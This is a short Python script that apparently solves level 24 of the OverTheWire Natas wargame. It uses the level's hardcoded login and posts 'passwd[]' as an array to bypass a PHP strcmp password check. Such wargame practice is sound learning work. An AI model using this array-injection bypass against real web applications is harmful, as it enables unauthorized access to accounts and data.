import requests

username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = "http://%s.natas.labs.overthewire.org" % username

data = {
    'passwd[]': ''
}

r = requests.post(url, data=data, auth=(username,password))
print(r.text)